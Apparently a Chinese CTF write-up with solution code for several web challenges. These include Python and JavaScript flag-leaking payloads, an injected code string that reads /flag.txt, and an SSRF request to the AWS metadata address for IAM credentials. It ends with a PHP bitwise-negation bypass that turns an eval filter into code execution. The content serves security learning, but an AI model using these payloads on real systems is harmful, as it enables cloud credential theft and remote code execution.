> 关联：[[index|CTF wp]]、[[../index|安全学习]]

```python
# 声明我们要覆盖全局作用域的函数
global exit, open

# 覆盖 exit，让它什么都不做，从而继续执行后面的 flag 写入逻辑
def exit(code=None):
    pass

# 定义一个伪造的文件对象类
class Hook:
    def write(self, data):
        # 当 flag 逻辑调用 f.write(flag_content) 时，这里会打印 flag
        print(f"FLAG_FOUND: {data}")
    def __enter__(self):
        return self
    def __exit__(self, *args):
        pass

# 覆盖全局 open 函数
def open(file, mode='r'):
    return Hook()

print("Payload active, waiting for the hidden code...")
```


```js
(async () => {
    console.log("开始直接从 API 获取数据...");
    const total = parseInt(document.getElementById('totalPages').textContent) || 480;
    let hexResult = "";

    for (let i = 1; i <= total; i++) {
        try {
            // 直接调用代码里的 API 路径
            const response = await fetch(`/api/flag/char/${i}`);
            const data = await response.json();
            if (data.status === 'success') {
                hexResult += data.char;
                if (i % 20 === 0) console.log(`进度: ${i}/${total}`);
            }
        } catch (e) {
            console.error(`第 ${i} 页获取失败:`, e);
        }
    }

    console.log("=== 采集完成 ===");
    console.log("完整的 Base16 字符串：");
    console.log(hexResult);
    
    // 自动尝试转换
    try {
        let str = "";
        for (let n = 0; n < hexResult.length; n += 2) {
            str += String.fromCharCode(parseInt(hexResult.substr(n, 2), 16));
        }
        console.log("解码后的文本：", str);
    } catch(e) {
        console.log("解码失败，请手动到 CyberChef 解码。");
    }
})();
```
# 复仇
```javascript
fetch('/api/send_input', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        pid: '07e8460f4ead6ae8', // 确认这个PID依然是当前运行的那个
        input: '!import sys; print("---FLAG---"); print(globals().get("flag_content")); print(open("/flag.txt").read()); sys.stdout.flush()'
    })
});
```
```python
breakpoint()
while True:
    pass
```

# CCPreview
题目描述：
```
为了测试内网服务的连通性，【数据删除】开发组上线了一个简单的网页预览工具。  
据说该服务部署在 AWS 也就是亚马逊云服务上，属于EC2实例……  
虽然它看起来只是一个简单的 curl 代理.jpg  
“话说，咱们就这么部署在这里，真的没问题吗……”  
“怕啥，这就一个curl，能有什么漏洞？”
```
这是一道云安全的题目，一个curl的代理，部署在了亚马逊云上面。
这里需要知道一个知识点：
EC2实例都会有一个特殊的IP地址，
```
169.254.169.254
```
这是亚马逊云的一个查看元数据的ip。我们可以访问latest/meta-data/查看元数据
payload：
```txt
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role
```
就返回了json：
```json
{
 'Code': 'Success',
 'Type': 'AWS-HMAC', 
 'AccessKeyId': 'AKIA_ADMIN_USER_CLOUD', 
 'SecretAccessKey': 'POFP{937d870d-bf90-4fc0-a395-7f25ba855696}',
 'Token': 'MwZNCNz... (Simulation Token)', 
 'Expiration': '2099-01-01T00:00:00Z'
}
```

# 命令终端
按照题目提示的账号密码进入终端，题目说可用dirsearch扫描，我们扫描一下：
```ps
D:\webtool\Dirsearch>python dirsearch.py -u http://challenge.furryctf.com:33115/main -t 10
D:\webtool\Dirsearch\lib\core\installation.py:24: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 10 | Wordlist size: 12289

Target: http://challenge.furryctf.com:33115/

[08:49:08] Scanning: main/
[08:51:50] 200 -    1KB - /main/www.zip

Task Completed
```
找到了一个备份文件地址，下载：
```php
<?php
session_start();
if (empty($_SESSION['user_id']) || !is_int($_SESSION['user_id'])) {
    header('Location: ../index.php', true, 302);
    exit;
}
$output = "";
if (isset($_POST['cmd'])) {
    $code = $_POST['cmd'];
    if(strlen($code) > 200) {
        $output = "略略略，这么长还想执行命令？";
    } 
    else if(preg_match('/[a-z0-9$_\."`\s]/i', $code)) {
        $output = "啊哦，你的命令被防火墙吃了\n&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;来自waf的消息：杂鱼黑客，就这样还想执行命令？";
    } 
    else {
        ob_start();
        try {
            eval($code);
        } catch (Throwable $t) {
            echo "Execution Error.";
        }
        $output = ob_get_clean();
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>命令执行</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 50px; }
        .console { border: 1px solid #333; padding: 20px; max-width: 800px; margin: 0 auto; }
        textarea { width: 100%; height: 100px; background: #111; border: 1px solid #444; color: #0f0; }
        input[type="submit"] { margin-top: 10px; background: #222; color: #fff; border: 1px solid #fff; padding: 5px 20px; cursor: pointer; }
        .output { margin-top: 20px; border-top: 1px dashed #444; padding-top: 10px; color: #ccc; white-space: pre-wrap;}
        .hint { font-size: 0.8em; color: #444; margin-top: 50px; text-align: center; }
        a { color: #222; text-decoration: none; }
        a:hover { color: #444; }
    </style>
</head>
<body>
    <div class="console">
        <h1>命令执行工具</h1>
        <p>欢迎您, <?php echo htmlspecialchars($_SESSION['user']); ?>. 命令执行系统准备完毕.</p>
        <form method="POST">
            <p>> 请输入您的命令:</p>
            <textarea name="cmd" placeholder="输入你的命令"></textarea>
            <br>
            <input type="submit" value="执行">
        </form>
        <div class="output">
            <strong>命令输出:</strong><br>
            <?php echo $output; ?>
        </div>
        <!--当你迷茫的时候可以想想backup-->
    </div>
</body>
</html>
```
看到源码知道是一个无字母数字RCE。
我们取反绕过:
```php
<?php
$str = "phpinfo";
$payload = "";
for($i=0; $i<strlen($str); $i++){
    $payload .= urlencode(~$str[$i]);
}
echo "(~'$payload')();";
?>
```
成功获得phpinfo界面
最终exp：
```php
<?php  
$func = "readfile";  
$arg = "/flag";  
$payload = "";  
function encode_str($str)  
{  
    $res="";  
    for ($i = 0; $i < strlen($str); $i++) {  
        $res .= urlencode(~$str[$i]);  
    }  
    return $res;  
}  
$function = encode_str($func);  
$argc = encode_str($arg);  
  
echo "(~'$function')(~'$argc');";  
  
?>
```
利用脚本生成的payload成功获得flag
